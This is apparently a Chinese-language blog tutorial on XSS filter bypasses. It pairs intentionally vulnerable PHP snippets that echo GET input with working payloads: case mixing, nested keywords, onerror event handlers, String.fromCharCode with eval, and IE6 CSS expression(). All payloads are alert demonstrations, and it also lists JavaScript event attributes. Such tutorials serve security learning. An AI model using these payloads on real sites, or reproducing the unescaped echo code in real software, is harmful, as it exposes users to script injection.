# XSS绕过分析

## 0x00 前言

本文介绍简单xss利用及其绕过，几个案例，都是比较简单的。

## 0x01 分析

### 1、无安全方面的限制，直接使用

关键代码：

```
<?php
@$id = $_GET['id'];
echo $id;
```

payload：

`<script>alert('zhuling.wang')</script>`

### 2、大小写绕过

关键代码：

```
<?php
function xss_check($str){
    $str = preg_replace('/script/',"", $str);
    $str = preg_replace('/alert/',"", $str);
    return $str;
}

@$id = $_GET['id'];
echo xss_check($id);
?>
```

过滤了script和alert,但是没设置不区分大小写，导致可利用大小写混写绕过

payload:

`<ScRipt>ALeRt("zhuling.wang");</sCRipT>`

### 3、重写绕过

关键代码:

```
<?php
function xss_check($str){
    $str = preg_replace('/script/i',"", $str);
    $str = preg_replace('/alert/i',"", $str);
    return $str;
}

@$id = $_GET['id'];
echo xss_check($id);
?>
```

代码中多了个i，i在PHP正则表达式中表示不区分大小写,但是过滤函数只执行了一次，进行过滤替换，而不是down掉，所以可利用重写绕过

payload:

`<sscriptcript>aalertlert('zhuling.wang');</sscriptcript>`

### 4、利用事件绕过

关键代码:

```
<?php
function xss_check($str){
    if(preg_match('/script/i', $str))
        return 'error';
    else
        return $str;
}

@$id = $_GET['id'];
echo xss_check($id);
?>
```

正则匹配到script直接返回错误，不可利用重写，这里可以利用js里面的事件来绕过

payload:

`<img src=1 onerror=alert('zhuling.wang');>`

下面是js事件的属性，可根据页面的情况选择不同的事件

```

属性	       当以下情况发生时，出现此事件
onabort	    图像加载被中断
onblur	    元素失去焦点
onchange	用户改变域的内容
onclick   	鼠标点击某个对象
ondblclick	鼠标双击某个对象
onerror   	当加载文档或图像时发生某个错误
onfocus   	元素获得焦点
onkeydown	某个键盘的键被按下
onkeypress	某个键盘的键被按下或按住
onkeyup	    某个键盘的键被松开
onload	    某个页面或图像被完成加载
onmousedown	某个鼠标按键被按下
onmousemove	鼠标被移动
onmouseout	鼠标从某元素移开
onmouseover	鼠标被移到某元素之上
onmouseup	某个鼠标按键被松开
onreset	    重置按钮被点击
onresize	窗口或框架被调整尺寸
onselect	文本被选定
onsubmit	提交按钮被点击
onunload	用户退出页面
```

### 5、编码绕过

关键代码:

```
<?php
function xss_check($str){
    if(preg_match('/script|alert/i', $str))
        return 'error';
    else
        return $str;
}

@$id = $_GET['id'];
echo xss_check($id);
?>
```

屏蔽了alert(也可能是其他的)，此时可以使用编码绕过

payload:

```
<img src=1 onerror="eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 47, 122, 104, 117, 108, 105, 110, 103, 46, 119, 97, 110, 103, 47, 41))">
```

其中String.fromCharCode(97, 108, 101, 114, 116, 40, 47, 122, 104, 117, 108, 105, 110, 103, 46, 119, 97, 110, 103, 47, 41)是alert(/zhuling.wang/)编码后的内容，火狐插件hackbar有此功能

### 6、IE6下绕过

IE下还可利用javascript:alert(/zhuling.wang/); 或css

```
body {
background:black;
xss:expression(alert(/zhuling.wang/));/*IE6下测试*/
}
```

## 0x02 小结

**注意在实战中闭合原来的标签，根据页面情况构造合适的xss**

**如有错误之处请指出**

**转载请注明出处**

著作权归作者所有。
商业转载请联系作者获得授权，非商业转载请注明出处。
作者：p0
链接：https://p0sec.net/index.php/archives/60/
来源：https://p0sec.net/